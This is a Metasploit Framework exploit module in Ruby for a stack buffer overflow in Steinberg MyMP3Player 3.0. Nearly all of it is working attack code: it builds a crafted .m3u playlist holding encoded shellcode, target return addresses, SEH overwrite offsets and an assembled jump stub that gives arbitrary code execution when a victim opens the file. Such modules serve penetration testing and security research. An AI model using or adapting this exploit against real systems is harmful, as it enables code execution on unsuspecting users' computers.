##
# $Id: mymp3player_m3u.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Steinberg MyMP3Player 3.0 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Steinberg MyMP3Player == 3.0. When
				the application is used to open a specially crafted m3u file, a buffer overflow occurs
				allowing arbitrary code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'n3w7u', # original
					'm_101'
				],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'OSVDB', '64580'],
					[ 'URL', 'http://www.exploit-db.com/exploits/11791' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 900,
					'BadChars' => "\x00\x0a\x0d\x5c",
					'DisableNops'  => true,
					'PrependEncoder' => "\x81\xc4\xf0\xef\xff\xff"
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x0043bea3 } ],        # call ecx in My MP3.exe v3.0.0.67
					[ 'Windows Universal (SEH)', { 'Ret' => 0x00403e68 } ],  # p/p/r in My MP3.exe v3.0.0.67
					[ 'Windows XP SP3 French', { 'Ret' => 0x72c6170b } ], # seh return in msacm.drv
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 18 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),
			], self.class)

	end

	def exploit

		# direct ret overwrite at offset 1024
		# nseh overwrite at offset 1040
		ret_offset = 1024
		seh_offset = 1040

		# start with the payload
		m3u = payload.encoded

		if (target.name =~ /SEH/)
			m3u << rand_text_alphanumeric(seh_offset - m3u.length)
			# ensure bad,no-nul addr for ret (trigger SEH)
			m3u[ret_offset,4] = [0xc0010101 | rand(0xffffffff)].pack('V')

			# We utilize a small stub near the end of the buffer space to
			# continue to the real shellcode...
			# NOTE: the push is to avoid a badchar (0x5c)
			stub = <<-EOF
push ecx
sub esp,-0x1a8
ret
EOF
			stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub).encode_string
			m3u[seh_offset - stub.length, stub.length] = stub

			# Jump back to the stub
			jmp2 = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + stub.length.to_s).encode_string
			seh = ''
			seh << jmp2
			seh << rand_text(2)
			seh << [target.ret].pack('V')
			m3u << seh
		else
			m3u << rand_text_alphanumeric(1024 - m3u.length)
			m3u << [target.ret].pack('V')
		end

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(m3u)

	end

end
